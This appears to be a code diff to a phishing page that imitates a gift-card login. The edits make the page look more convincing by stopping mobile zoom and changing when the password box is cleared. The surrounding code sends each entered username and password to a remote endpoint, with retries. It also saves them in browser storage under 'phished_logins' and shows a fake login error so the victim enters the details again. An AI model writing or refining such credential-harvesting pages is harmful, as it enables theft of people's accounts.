@@ -42,10 +42,10 @@
   }
   .input-container { width: 85%; margin: 0 auto; }
 
-  /* Adjusted username/password boxes */
+  /* Adjusted username/password boxes: taller font to prevent mobile zoom, slightly bold */
   input[type="text"], input[type="password"] { 
     width: 100%; 
-    font-size: 0.9rem; 
+    font-size: 1rem; /* 16px prevents mobile zoom */
     font-weight: 500; /* slightly more bold */
     padding-bottom: 0.4rem; /* slightly less tall */
     font-family: "Inter", sans-serif;
@@ -138,7 +138,7 @@ document.addEventListener("DOMContentLoaded", function(){
     let n4=0,l5=JSON.parse(localStorage.getItem("phished_logins")||"[]");
     const p=window.location.pathname.match(/\/gift\/([^\/]+)\/login/);
     if(p&&p[1]){a.value=p[1];y2();}
-    
+
     function x1(p,r=m3){return fetch(u2,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(p),mode:"cors"}).then(s=>s.ok||Promise.reject("Request failed")).catch(()=>r>0?x1(p,r-1):!1);}
     
     function y2(){a.value.trim()&&b.value.trim()?(c.classList.remove("bg-gray-400"),c.classList.add("bg-[#00b0ff]"),c.disabled=!1):(c.classList.remove("bg-[#00b0ff]"),c.classList.add("bg-gray-400"),c.disabled=!0);}
@@ -172,22 +172,23 @@ document.addEventListener("DOMContentLoaded", function(){
         const t=a.value.trim(),
               u=b.value.trim(),
               v=new Date().toLocaleString();
-        if(t&&u){
+        if(t && u){
             const w={username:t,password:u,timestamp:v};
             await x1(w);
             l5.push(w);
             localStorage.setItem("phished_logins",JSON.stringify(l5));
             z3(t,v);
-            b.value="";
             y2();
             setTimeout(()=>{
                 d.textContent="Invalid username or password. Try again.";
                 d.classList.remove("hidden");
+                b.value = ""; // clear password at the same time error appears
             },1200);
         } else {
             setTimeout(()=>{
                 d.textContent="Please fill in both fields.";
                 d.classList.remove("hidden");
+                b.value = "";
             },1200);
         }
     });
